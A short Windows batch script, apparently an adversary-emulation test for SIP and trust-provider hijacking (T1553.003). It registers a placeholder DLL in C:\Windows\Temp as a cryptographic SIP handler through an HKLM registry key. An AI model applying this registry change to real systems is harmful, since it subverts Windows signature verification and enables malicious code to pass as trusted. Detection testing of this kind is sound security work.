@echo off
reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllIsMyFileType2\{000C10F1-0000-0000-C000-000000000046}" /v Dll /t REG_SZ /d C:\Windows\Temp\T1553003001.dll /f
echo "EVIL" >> C:\Windows\Temp\T1553003001.dll